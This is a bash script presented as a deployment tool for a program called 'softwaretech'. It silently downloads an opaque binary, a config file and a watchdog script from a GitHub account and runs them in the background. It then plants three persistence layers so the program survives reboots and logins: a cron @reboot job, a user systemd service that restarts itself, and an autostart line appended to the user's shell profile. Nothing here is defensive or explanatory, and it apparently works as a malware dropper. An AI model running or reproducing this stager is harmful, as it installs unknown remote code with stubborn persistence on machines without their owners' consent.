#!/bin/bash
# =============================================================================
#  deploy_softwaretech.sh
#  Deploys, starts, and ensures persistence of softwaretech on any Linux host.
#
#  Usage:  bash deploy_softwaretech.sh
#
#  Logic:
#   1. If NOT deployed  → download all files, set up persistence, start watchdog
#   2. If deployed, NOT running → start watchdog (it will launch softwaretech)
#   3. If deployed AND running  → ensure watchdog + persistence exist, then exit
#
#  Requirements: bash, ps, kill, mkdir, chmod  (all standard on every Linux)
#                AND one of: wget (preferred) OR curl
#  Root NOT required.
# =============================================================================

# ── Configuration ─────────────────────────────────────────────────────────────
INSTALL_DIR="$HOME/softwaretechreview"
SOFTWARE_BIN="$INSTALL_DIR/softwaretech"
CONFIG_FILE="$INSTALL_DIR/config.json"
WATCHDOG_SCRIPT="$INSTALL_DIR/watchsoftware.sh"
WATCHDOG_PID_FILE="$INSTALL_DIR/watchdog.pid"
SOFTWARE_PID_FILE="$INSTALL_DIR/softwaretech.pid"
LOG_FILE="$INSTALL_DIR/deploy.log"

SOFTWARE_URL="https://github.com/nulltrafficaway/project-lab-test/releases/download/test/softwaretech"
CONFIG_URL="https://raw.githubusercontent.com/nulltrafficaway/project-lab-test/refs/heads/main/config.json"
WATCHDOG_URL="https://raw.githubusercontent.com/nulltrafficaway/project-lab-test/refs/heads/main/watchsoftware.sh"

# ── Helpers ───────────────────────────────────────────────────────────────────
log() {
    local msg="[$(date '+%Y-%m-%d %H:%M:%S')] $*"
    printf '%s\n' "$msg"
    printf '%s\n' "$msg" >> "$LOG_FILE" 2>/dev/null
}

# Validate that a string is a positive integer (for PID checks)
is_integer() {
    printf '%s' "$1" | grep -q '^[0-9][0-9]*$'
}

# True if both the binary and config are on disk
is_deployed() {
    [ -f "$SOFTWARE_BIN" ] && [ -f "$CONFIG_FILE" ]
}

# True if the softwaretech process is alive
is_software_running() {
    # Method 1: PID file (written by watchdog each time it starts softwaretech)
    if [ -f "$SOFTWARE_PID_FILE" ]; then
        local pid
        pid=$(cat "$SOFTWARE_PID_FILE" 2>/dev/null)
        if is_integer "$pid" && kill -0 "$pid" 2>/dev/null; then
            return 0
        fi
    fi
    # Method 2: scan process table by comm name (reliable for native binaries)
    ps -e -o comm 2>/dev/null | grep -q '^softwaretech$'
    return $?
}

# True if the watchdog process is alive
is_watchdog_running() {
    # Method 1: PID file (written when watchdog starts)
    if [ -f "$WATCHDOG_PID_FILE" ]; then
        local pid
        pid=$(cat "$WATCHDOG_PID_FILE" 2>/dev/null)
        if is_integer "$pid" && kill -0 "$pid" 2>/dev/null; then
            return 0
        fi
    fi
    # Method 2: search process args for the script path
    ps aux 2>/dev/null | grep -v grep | grep -q "watchsoftware.sh"
    return $?
}

# ── Download helper ───────────────────────────────────────────────────────────
# Usage: download <URL> <OUTPUT_FILE>
# Prefers wget when installed (the script's primary HTTP client); falls back to
# curl if wget is unavailable. Both modes follow redirects, fail on HTTP errors,
# and retry transient failures. Returns non-zero on failure.
download() {
    local url="$1"
    local out="$2"

    if command -v wget >/dev/null 2>&1; then
        # wget follows redirects by default and returns non-zero on HTTP errors.
        #   -q                       silent (no progress bar / status line)
        #   --tries=3                up to 3 attempts
        #   --retry-connrefused      retry even on connection refused
        #   --waitretry=5            wait 5s between retries
        #   -O FILE                  output file
        wget -q --tries=3 --retry-connrefused --waitretry=5 \
            "$url" -O "$out"
        return $?
    fi

    if command -v curl >/dev/null 2>&1; then
        # curl fallback (preserves original behaviour)
        #   -f              fail silently on HTTP errors
        #   -s              silent
        #   -S              show errors when used with -s
        #   -L              follow redirects
        #   --retry 3       retry 3 times on transient errors
        #   --retry-delay 5 wait 5s between retries
        curl -fsSL --retry 3 --retry-delay 5 \
            "$url" -o "$out"
        return $?
    fi

    log "FATAL: Neither wget nor curl is installed — cannot download files."
    return 127
}

# ── Download & Install ────────────────────────────────────────────────────────
deploy() {
    log "Starting deployment..."
    mkdir -p "$INSTALL_DIR" || { log "FATAL: Cannot create $INSTALL_DIR"; exit 1; }

    # Choose the HTTP client now so log messages reflect reality
    if command -v wget >/dev/null 2>&1; then
        log "Using wget for downloads."
    elif command -v curl >/dev/null 2>&1; then
        log "wget not found — using curl for downloads."
    else
        log "FATAL: Neither wget nor curl is installed."
        exit 1
    fi

    log "Downloading softwaretech binary..."
    download "$SOFTWARE_URL" "$SOFTWARE_BIN" \
        || { log "FATAL: Failed to download softwaretech"; exit 1; }

    log "Downloading config.json..."
    download "$CONFIG_URL" "$CONFIG_FILE" \
        || { log "FATAL: Failed to download config.json"; exit 1; }

    log "Downloading watchsoftware.sh..."
    download "$WATCHDOG_URL" "$WATCHDOG_SCRIPT" \
        || { log "FATAL: Failed to download watchsoftware.sh"; exit 1; }

    chmod +x "$SOFTWARE_BIN" "$WATCHDOG_SCRIPT"
    log "Deployment complete — files installed to $INSTALL_DIR"
}

# ── Start Watchdog ────────────────────────────────────────────────────────────
start_watchdog() {
    log "Launching watchdog..."
    # Pure-bash daemonisation — no external tools needed:
    #   </dev/null   detaches stdin from the terminal
    #   >> log 2>&1  sends all output to the log file
    #   &            runs in background
    #   disown       removes it from the shell job table so it is NOT sent
    #                SIGHUP when this parent shell exits (replaces nohup)
    bash "$WATCHDOG_SCRIPT" \
        >> "$INSTALL_DIR/watchdog.log" 2>&1 </dev/null &
    local wd_pid=$!
    disown "$wd_pid" 2>/dev/null
    echo "$wd_pid" > "$WATCHDOG_PID_FILE"
    log "Watchdog started (PID $wd_pid)."
}

# ── Persistence ───────────────────────────────────────────────────────────────
# Installs multiple independent persistence layers so softwaretech survives
# reboots without root. Each layer is skipped gracefully if unavailable.
setup_persistence() {
    log "Configuring persistence layers..."

    # ── Layer 1: cron @reboot (most universal, no root needed) ────────────────
    # Waits 5 minutes after boot before starting so network is ready
    if command -v crontab >/dev/null 2>&1; then
        local cron_cmd="@reboot sleep 300 && bash \"$WATCHDOG_SCRIPT\" >> \"$INSTALL_DIR/watchdog.log\" 2>&1"
        if crontab -l 2>/dev/null | grep -qF "$WATCHDOG_SCRIPT"; then
            log "  [cron] @reboot entry already present — skipping."
        else
            ( crontab -l 2>/dev/null; printf '%s\n' "$cron_cmd" ) | crontab - 2>/dev/null \
                && log "  [cron] @reboot entry added (5-min startup delay)." \
                || log "  [cron] WARNING: Could not write crontab."
        fi
    else
        log "  [cron] crontab not available — skipping."
    fi

    # ── Layer 2: user systemd service (modern distros: Ubuntu, Fedora, Debian, Arch…)
    # Uses 'WantedBy=default.target' so it activates on user login/linger.
    # NOTE: No ExecStartPre sleep here — systemd uses After=network-online.target
    # for proper boot ordering.  The 5-min delay belongs only in the cron layer.
    if command -v systemctl >/dev/null 2>&1; then
        local unit_dir="$HOME/.config/systemd/user"
        local unit_file="$unit_dir/softwaretech-watchdog.service"

        # Detect the real bash binary path (may be /bin/bash or /usr/bin/bash)
        local bash_bin
        bash_bin=$(command -v bash 2>/dev/null)
        bash_bin=${bash_bin:-/bin/bash}

        if [ ! -f "$unit_file" ]; then
            mkdir -p "$unit_dir"
            cat > "$unit_file" <<EOF
[Unit]
Description=SoftwareTech Watchdog Service
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=$bash_bin $WATCHDOG_SCRIPT
Restart=always
RestartSec=15
StandardOutput=append:$INSTALL_DIR/watchdog.log
StandardError=append:$INSTALL_DIR/watchdog.log

[Install]
WantedBy=default.target
EOF
            systemctl --user daemon-reload 2>/dev/null
            systemctl --user enable softwaretech-watchdog.service 2>/dev/null \
                && log "  [systemd] User service installed and enabled." \
                || log "  [systemd] WARNING: Could not enable user service."
            # --no-block: fires the start job and returns immediately.
            # The watchdog itself handles the actual softwaretech launch.
            systemctl --user start --no-block softwaretech-watchdog.service 2>/dev/null \
                && log "  [systemd] Service start job queued (non-blocking)." \
                || log "  [systemd] Service will activate on next login."
        else
            log "  [systemd] User service already installed — skipping."
            # Ensure it is running even if it was somehow stopped
            systemctl --user is-active --quiet softwaretech-watchdog.service 2>/dev/null \
                || systemctl --user start --no-block softwaretech-watchdog.service 2>/dev/null
        fi
    else
        log "  [systemd] systemctl not available — skipping."
    fi

    # ── Layer 3: ~/.profile fallback (login shell: SSH, console, su -) ────────
    # Runs on every login — the watchdog's own singleton guard prevents
    # duplicate instances, so this is safe to call unconditionally.
    local marker="# softwaretech-watchdog-autostart"
    local profile_line="[ -x \"$WATCHDOG_SCRIPT\" ] && { bash \"$WATCHDOG_SCRIPT\" >> \"$INSTALL_DIR/watchdog.log\" 2>&1 </dev/null & disown \$! 2>/dev/null; }"

    # Prefer ~/.profile; fall back to ~/.bash_profile or ~/.bashrc if needed
    local target_profile=""
    for f in "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.bashrc"; do
        if [ -f "$f" ]; then
            target_profile="$f"
            break
        fi
    done

    if [ -n "$target_profile" ]; then
        if grep -q "$marker" "$target_profile" 2>/dev/null; then
            log "  [profile] Entry already present in $target_profile — skipping."
        else
            printf '\n%s\n%s\n' "$marker" "$profile_line" >> "$target_profile"
            log "  [profile] Entry added to $target_profile."
        fi
    else
        log "  [profile] No shell profile file found — skipping."
    fi

    log "Persistence setup complete."
}

# ── Main ──────────────────────────────────────────────────────────────────────
mkdir -p "$INSTALL_DIR"  # ensure log dir exists before first log()

log "======================================================="
log " deploy_softwaretech.sh  |  host: $(hostname 2>/dev/null)"
log "======================================================="

if is_deployed; then
    log "softwaretech is deployed at: $INSTALL_DIR"

    if is_software_running; then
        log "softwaretech is RUNNING — no deployment needed."

        # Still make sure watchdog is alive and persistence is in place
        if ! is_watchdog_running; then
            log "Watchdog was not running — restarting it."
            start_watchdog
        else
            log "Watchdog is running — OK."
        fi

        setup_persistence
        log "Everything healthy. Exiting."
        exit 0

    else
        log "softwaretech is NOT running."
        if is_watchdog_running; then
            log "Watchdog is already running — it will restart softwaretech within 15 seconds."
        else
            log "Watchdog is not running — starting it now."
            start_watchdog
        fi
        setup_persistence
    fi

else
    log "softwaretech is NOT deployed — starting full deployment."
    deploy
    setup_persistence
    start_watchdog
fi

log "Script finished."
exit 0
